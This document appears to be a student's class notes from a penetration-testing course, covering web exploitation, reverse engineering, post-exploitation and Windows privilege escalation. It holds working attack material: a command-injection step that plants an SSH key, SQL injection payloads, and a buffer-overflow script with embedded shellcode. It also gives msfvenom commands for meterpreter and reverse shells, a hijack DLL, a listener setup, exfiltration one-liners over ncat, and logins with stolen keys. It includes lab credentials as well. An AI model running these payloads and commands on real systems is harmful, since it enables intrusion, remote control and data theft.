## Misc 

            https://sec.cybbh.io/public/security/latest/index.html
#### Test Day: August 15th

            xfreerdp /u:student /v:10.50.37.222 /dynamic-resolution +glyph-cache +clipboard


            Jump Box:   ssh student@10.50.20.235 -X 
                        CHT8QBJ8TQBlv7S
                        JOHA-005-M

            LinOps:     ssh student@10.50.40.22 -X  

            WinBox:     ssh student@10.50.37.222
                         
            ctf : server -> http://10.50.20.250:8000/

## Day 1 - Recon/Research/Pen Testing
### Pen Testing

#### Pen Testing Test Reporting

    OPNotes
      Actions being taken that works, maps, the things that have worked. Keeping track of the steps

    Penetration Test Reporting
      Executive Summary
        The tops, not evertything but a summary
      Technical Summary
        In the weeds, the more technical stuff
## Day 2 - Web Explotation
### HTTP Methods
    GET, POST, HEAD, PUT

### HTTP Response Codes
    10X Info, 2XX Success, 30X Redir, 4XX Client Err, 5XX Serv Err

### JavaScript (JS)
    HTML Frame of the House
    CSS is the paint and decoration
    JavaScript is used to change things afterwards

### HTTP Enumeration
```
nmap -v -sT -T5 --script http-enum.nse 10.50.31.75 -> web enum
nikto -h 10.50.31.75 -> info about the sub dirs 

sudo apt install nikto -y
```

### Cross-Site Scripting
    Attacker puts bad stuff on trusted website, it allows it to execute bad code
#### Reflected XSS
    Not stored, run JS on website, changes url, bad code in url
#### Stored XSS
    Actually stored on server

### Demo
    lin-ops> ssh-keyget -t rsa "enter", "enter" is in /home/student/.ssh/id_rsa"
    passhprhase -> blank
    have genterated key
    cd ~/.ssh 
    ca id_rsa.pub(lic key) "generated public key"
    in search box
        : whoami -> www-data
        : cat /etc/passswd -> home dir is /var/www
        : ls -la /var/www -> see if .ssh file is created
        : mksir /var/www/.ssh
        : echo "ssh-rsa 'key' student@lin-ops" > /var/www/.ssh/authorized_keys

## Day 3 - Web Explotation  Part 2 - SQL Injection 
### MySql
    Unsanitized vs Sanitized Fields
        Unsanitized test, enter '
            will return info, no errors or jeneric error
        Santized: items are removed, escaped into single string

    Server-Side Query Processing
        Before Input
            name='$name'...
            nmae='JohnDoe'

### Injecting Statemnet
    User Enters TOM' OR 1='1 in the name and pass fields
    Truth Statemnet: tom 'OR 1=' 1

    Back End
        name='tom' OR 1='1' AND PASS='tom' OR 1='1'

##
    mysql
    use session;
    select * from user;
    select id from user where name='admin';  = 0
    select id from user where name='tom';  = none
    select * from user where name='tom' OR 1=1;  = eveyrthing
    stacking statements, chain statements togetyher with ;

    To find the version
        Audi' UNION SELECT @@version,database(); #

## Nesting Statements
    # ignore the rest or -- tells to ignore stuff, comment out some of the sql error

## Day 4 - Reverse Engineering
     
### X86_64 Assembly - Common Terms
    Heap, Stack, Gen. Register, Ctrl. Register, Flags Register
    
### Reverse Engineering Workflow (Software)
```Shell
#!/usr/bin/python2.7

# FILL UP THE BUFFER 
buf = "A" * 62

#EIP Register to JMP ESP

buf += "\x59\x3b\xde\xf7"

#The mem addresses for JMP ESP

'''
0xf7de3b59 "\x59\x3b\xde\xf7"
0xf7f588ab
0xf7f645fb
0xf7f6460f
'''
## Assits with encoding NOP SLED
buf += "\x90" * 10

# Shell Code / palyoad below
# set CMD whoami && ifconfig


buf += b"\xdb\xc3\xd9\x74\x24\xf4\x58\xbb\xe6\xef\x4a\x63"
buf += b"\x29\xc9\xb1\x0e\x31\x58\x19\x03\x58\x19\x83\xe8"
buf += b"\xfc\x04\x1a\x20\x68\x90\x7c\xe7\x08\x48\x52\x6b"
buf += b"\x5c\x6f\xc4\x44\x2d\x07\x15\xf3\xfe\xb5\x7c\x6d"
buf += b"\x88\xda\x2d\x99\x99\x1c\xd2\x59\xe9\x74\xbd\x38"
buf += b"\x78\xed\x61\x9d\xa4\xcd\x08\x87\xcb\x62\xa5\x21"
buf += b"\x65\x1b\x39\xf9\x26\x6a\xd8\xc8\x49"

print(buf)
```

### Windows
```SHell
vim SecureServerBuff.py#!/usr/bin/python2.7
import socket
'''
addr
addr
'''buf = "TRUN/.:/"buf += "A" * 3000
#buf += "wirechars"
#buf += "\xad\xdr\xsw\xap" JMP ESP
#buf += "\x90" * 15
#buf += msfvenom commands = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Creates IPv4 sockets.connect(("IP",port)) #IP and port connection
print s.recv(1024) #Recieve response
s.send(buf) #Sends buf to IP and port
print s.recv(1024) #recieve response
s.close() #close connectionrun py
```

# From Immunity Debugger, bottom screen run !mona modules to find unprotected modules
	
# to find the JMP ESP
[Log Data Tab]
>!mona jmp -r esp -m
 Output:
	0x625012a0
	0x625012ad
	0x625012ba

# Build Reverse TCP Payload
msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=4444 -b "\x00" -f python

# Execute the Exploit
>msfconsole
>use multi/handler
>set payload windows/meterpreter/reverse_tcp
>set LHOST 0.0.0.0
>set LPORT 4444
>explot

### Post Exploitation
            MISC:
                        SSH
                        ssh <user>@<ip> <cmd>
                        ssh student@10.50.32.38 ls -lisa
                        Priv Key Logon
                                    find private key, can use it to authenticate without password
                                                chmod +x /<stolenkey of user>
                                                ssh -i <stolen key of user> <user>@<ip>
                        
#### Control Sockets
            Benefits: 
                        Multiplexing
                        Data Exfiltration
                        Less Logging
##### Demo for Control Sockets
            ssh -MS /tmp/gray student@10.50.32.38
                        [gray is a file in a temp that is a socket file]
            ssh -S /tmp/gray <placeholder>
                        [will connect to the box the original socket was created with]
            ssh -MS /tmp/gray -O[option] cancel <user>@<ip> 
            
            ssh -S /tmp/gray <placeholder? -O forward -L<port>:<ip>:<port>

            ssh -S /tmp/gray dummy -O forward -D9050

#### Enumeration
            To find all the users on a box, processes, 
            Win:
                        net user
                        tasklist /v
                        tasklist /svc
		ipconfig /all
            Linux:
                        cat /etc/passwd
                        ps -elf
                        chkconfig			# SysV
                        systemtcl --type=service            # SystemD
		ipconfig -a			# SysV
  		ip a			$ SystemD
#### Exfiltration
	ssh <user>@<host> | tee
 	Windows
  		type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
		certutil -encode <file> encoded.b64
  
  	Linux
   		cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
		cat <file>> | base64
  
  	Encrypted Transport
   		scp <source> <destination>
		ncat --ssl <ip> <port> < <file>
		
## Windows Priv Escalation and Logging


### Win Access Control Model
	Access Tokens
	Sec Descriptiors
		DACL
		SACL
		ACEs
	
	DLL Search Order
		DLL Search Order -> 
			HKLM\System\Currentcontrolset\Control\Session Manager\KnownDLLs
			dir app ran from
			c code run from, getsystemdir
			c cdoe in the c+ function getwindows directory
			current dir
			
### Integrioty Mechanisms
	Untrusted
	Low
	Medium
	High
	System

### UAC
	kind of like sudo, will allow to run as admin

### AutoElevate Executables
	Execution Level:
		asInvoker
		highestAvailable
		
	find execution levels
		sigcheck -m <file>
		
### Scheduled Tasks & Services
	evaluate
		write perms, non-standard locations, unquoted exe paths, vulmerablities in exe, run as system

### Find Vuln Scheduled Tasks
	schtasks /query /fo LIST /v
	schtasks /query /fo LIST /v | select-string -Pattern "Task To Run" -CaseSensitive | select-string -pattern "COM handler" -NotMatch
	sigcheck putty
	icacls "directory", find what permissions you have for the file in the directory
	look at proc mon to find the dll, path contains ddl, putty, find where it runs the dlls and how it does

	msfvenom to make payload
	Lin>
	msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\DemoAdmin\Desktop\whoami -f dll > SSPICLI.ddl
	
	Win> 
	scp student@linip:<filepathtodll> <whereyouwantdlltobe> [whenthe app is run it will search for the directory and the dll will run]
	
### Find Vuln Services
	wmic service list full
	sc query
	
	look in the services gui
	find shady services
	filter on description, look at shady ones, look at properties
		path to exe
		startup
	look at the file in the dir, see what you can do with it, find a file where you can do everything in
		
	msfvenom -p windows/shell_reverse_tcp LHOST=linops LPORT=<port> -f exe > <filename>
	net start <service> 	
	
	nc lvp <port> to get the shell
	net localgroup administrators
	
### Other Vulnerabilities
	Patch Kernel Vuln
	Patch Systems
	Patch Apps	
	
	
	
	
	
	
